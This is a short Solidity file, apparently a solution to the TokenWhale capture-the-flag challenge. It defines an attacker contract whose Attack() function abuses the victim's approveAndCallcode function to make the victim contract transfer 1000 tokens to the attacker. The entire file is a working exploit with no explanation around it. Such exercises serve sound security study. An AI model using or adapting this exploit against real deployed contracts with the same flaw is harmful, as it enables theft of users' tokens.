// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";

contract TokenWhaleAttacker {
    TokenWhale TokenWhaleContract;

    constructor(address _tokenWhaleAddress) {
        TokenWhaleContract = TokenWhale(_tokenWhaleAddress);
    }

    function Attack() public {
        TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
        TokenWhaleContract.approveAndCallcode(
            address(TokenWhaleContract), 0, abi.encodeWithSignature("transfer(address,uint256)", address(this), 1000)
        );
    }
}
